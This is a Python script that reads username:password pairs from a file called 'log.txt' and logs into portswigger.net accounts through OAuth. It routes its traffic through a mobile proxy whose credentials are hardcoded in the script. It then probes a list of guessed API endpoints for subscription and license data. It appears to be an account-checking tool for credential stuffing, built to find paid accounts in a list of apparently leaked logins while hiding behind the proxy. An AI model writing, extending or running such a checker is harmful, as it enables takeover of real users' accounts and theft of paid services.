#!/usr/bin/env python3
"""Try common API endpoints to find subscription data"""

import requests
import json
from urllib.parse import urljoin, parse_qs, urlparse

proxy_url = "http://buymobileproxycom:mugla9392@ankara8.buymobileproxy.com:8029"

# Read first account
with open("log.txt", 'r', encoding='utf-8') as f:
    for line in f:
        line = line.strip()
        if line and not line.startswith("#"):
            username, password = line.split(":", 1)
            username = username.strip()
            password = password.strip()
            break

print(f"[*] Test account: {username}\n")

# Create session
session = requests.Session()
session.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'})
session.proxies.update({'http': proxy_url, 'https': proxy_url})

# OAuth Login
print("[1] OAuth Login...")
auth_url = "https://login.portswigger.net/authorize?client_id=F1PNGMosqeuuNO5cKQzDesrY2XzvPWGz&redirect_uri=https://portswigger.net/signin-oidc&response_type=code&scope=openid+profile+email&code_challenge=BldXYnkHHNxMQttliGBK-tWU16bEzTbKyUsr9WnArgk&code_challenge_method=S256&response_mode=query"

try:
    resp = session.get(auth_url, allow_redirects=False, timeout=10)
    state = ""
    if resp.status_code in [301, 302, 303, 307, 308]:
        redirect_url = resp.headers.get('Location', '')
        if redirect_url and 'state=' in redirect_url:
            if not redirect_url.startswith('http'):
                redirect_url = urljoin("https://login.portswigger.net/", redirect_url)
            parsed = parse_qs(urlparse(redirect_url).query)
            if 'state' in parsed:
                state = parsed['state'][0]
            resp = session.get(redirect_url, allow_redirects=False, timeout=10)

    # Login
    login_url = f"https://login.portswigger.net/u/login"
    if state:
        login_url = f"{login_url}?state={state}"

    login_data = {
        "username": username,
        "password": password,
        "action": "default"
    }

    resp = session.post(login_url, data=login_data, allow_redirects=False, timeout=10)
    if resp.status_code in [301, 302, 303, 307, 308]:
        redirect_url = resp.headers.get('Location', '')
        if redirect_url:
            if not redirect_url.startswith('http'):
                redirect_url = urljoin("https://login.portswigger.net/", redirect_url)
            resp = session.get(redirect_url, allow_redirects=True, timeout=10)

    print(f"[✓] Login successful\n")
except Exception as e:
    print(f"[✗] Login error: {e}\n")
    exit(1)

# Test common API endpoints
print("[2] Testing common API endpoints:")
print("=" * 80)

api_endpoints = [
    # Common patterns
    "https://portswigger.net/api/subscription",
    "https://portswigger.net/api/subscriptions",
    "https://portswigger.net/api/account",
    "https://portswigger.net/api/user",
    "https://portswigger.net/api/user/subscription",
    "https://portswigger.net/api/user/subscriptions",
    "https://portswigger.net/api/user/account",
    "https://portswigger.net/api/user/plan",
    "https://portswigger.net/api/plan",
    "https://portswigger.net/api/plans",

    # GraphQL
    "https://portswigger.net/graphql",
    "https://portswigger.net/api/graphql",

    # REST patterns
    "https://portswigger.net/v1/subscription",
    "https://portswigger.net/v1/account",
    "https://portswigger.net/v1/user",

    # My account API
    "https://portswigger.net/api/my-account",
    "https://portswigger.net/api/myaccount",

    # License/product APIs
    "https://portswigger.net/api/licenses",
    "https://portswigger.net/api/license",
    "https://portswigger.net/api/products",
]

found_endpoints = []

for endpoint in api_endpoints:
    try:
        resp = session.get(endpoint, timeout=10)

        # Check if it's a valid response (not 404 or 500)
        if resp.status_code not in [404, 500, 502, 503]:
            print(f"\n[{resp.status_code}] {endpoint}")

            # Try to parse as JSON
            try:
                data = resp.json()
                print(f"  ✓ Valid JSON response!")
                print(f"  Content: {json.dumps(data, indent=2)[:500]}")
                found_endpoints.append((endpoint, data))
            except:
                print(f"  Status: {resp.status_code}, Length: {len(resp.text)} bytes")

                # Check for keywords in response
                if any(keyword in resp.text.lower() for keyword in ['subscription', 'plan', 'license']):
                    print(f"  ✓ Contains subscription data!")
                    found_endpoints.append((endpoint, resp.text[:500]))

    except Exception as e:
        pass

if found_endpoints:
    print(f"\n✓ Found {len(found_endpoints)} working endpoints:")
    for endpoint, data in found_endpoints:
        print(f"  - {endpoint}")
else:
    print("\n[-] No common API endpoints found")
    print("\n[*] The subscription data might be:")
    print("    1. Loaded via a custom/undiscovered API endpoint")
    print("    2. Embedded in the initial page load as JSON")
    print("    3. Requires browser execution (JavaScript)")

print("\n" + "=" * 80)
print("[*] API scan completed")
